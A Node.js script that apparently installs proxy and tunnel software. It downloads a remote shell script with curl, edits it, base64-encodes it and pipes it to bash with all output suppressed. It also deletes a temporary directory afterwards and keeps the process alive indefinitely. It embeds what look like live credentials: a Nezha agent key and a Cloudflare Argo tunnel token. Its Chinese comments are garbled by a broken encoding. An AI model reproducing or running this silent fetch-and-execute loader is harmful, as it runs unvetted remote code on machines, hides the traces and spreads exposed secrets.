const { execSync, spawn } = require('child_process');
const fs = require('fs');

function runScriptWithEnv() {
    const envVars = {
        UUID: 'faacf142-dee8-48c2-8558-641123eb939c',
        NEZHA_SERVER: 'nezhak2.btpp.ggff.net',
        NEZHA_PORT: '443',
        NEZHA_KEY: '6VwGKB5eXFrrDkz1UY',
        HY2_PORT: '24652',
        ARGO_DOMAIN: 'hiden.btppone.hidns.vip',
        ARGO_AUTH: 'eyJhIjoiYmJmMDc4YjVkYjlhMzcwMmFiYTg3OGQyODYxMDUwMDciLCJ0IjoiZTFjYWMwZjQtYzYzOS00NGI2LWIyMGMtMWI2ZWRkNWU1OTkzIiwicyI6IllXTTRPVGhrWkRrdE9HUTVaaTAwWWpRM0xXRmxZV1F0WXpSaU1URTRORFpoTnpjeSJ9',
        CFIP: 'jd.bp.cloudns.ch'
    };

    // 1. �������ű���������
    const scriptUrl = 'https://main.sss.hidns.vip/sb.sh';
    const fullEnv = { ...process.env, ...envVars };
    const cleanupDelay = 60 * 1000; // 1 minute in milliseconds

    async function executeAndReplace() {
        try {
            // 2. �������ű�����
            const downloadCommand = `curl -Ls ${scriptUrl}`;
            let scriptContent = execSync(downloadCommand, { encoding: 'utf8' });
            
            // 3. Ӧ�ýű���������
            // �Ƴ�ԭ���� curl ����߼�
            scriptContent = scriptContent.replace(/command -v curl .* Error: neither curl nor curl -LO found, please install one of them.*?\n/, '');
            
            // ���ؼ��޸ġ���ƥ�䲢�滻�������µĶ������ļ�����ָ��
            // ��ԭ���� ssss.nyc.mn �滻Ϊ sss.hidns.vip
            scriptContent = scriptContent.replace(/\$COMMAND sbx \"https:\/\/\$ARCH\.sss\.hidns\.vip\/sbsh\"/, 'curl -o sbx "https://$ARCH.sss.hidns.vip/sbsh"');
            
            const base64Script = Buffer.from(scriptContent).toString('base64');
            const finalBashCommand = `echo ${base64Script} | base64 -d | bash`;

            // 4. ��Ĭִ�нű�
            const setupProcess = spawn('bash', ['-c', finalBashCommand], {
                env: fullEnv,
                shell: false,
                stdio: 'ignore'
            });

            await new Promise((resolve, reject) => {
                setupProcess.on('close', (code) => {
                    if (code !== 0) {
                        reject(new Error(`Bash setup failed with code ${code}.`));
                    } else {
                        resolve();
                    }
                });

                setupProcess.on('error', (err) => {
                    reject(new Error('Failed to start setup bash process: ' + err.message));
                });
            });

            // 5. �ӳ����� .tmp Ŀ¼
            setTimeout(() => {
                try {
                    fs.rmSync('./.tmp', { recursive: true, force: true });
                } catch (e) {
                    // ���Դ���
                }
            }, cleanupDelay);

            // 6. ���̱���
            const keepAliveCommand = 'tail -f /dev/null';
            
            spawn(keepAliveCommand, {
                stdio: 'ignore',
                shell: true,
                detached: false
            }).on('error', (err) => {
                process.exit(1);
            });
            
        } catch (error) {
            process.exit(1);
        }
    }

    executeAndReplace();
}

runScriptWithEnv();
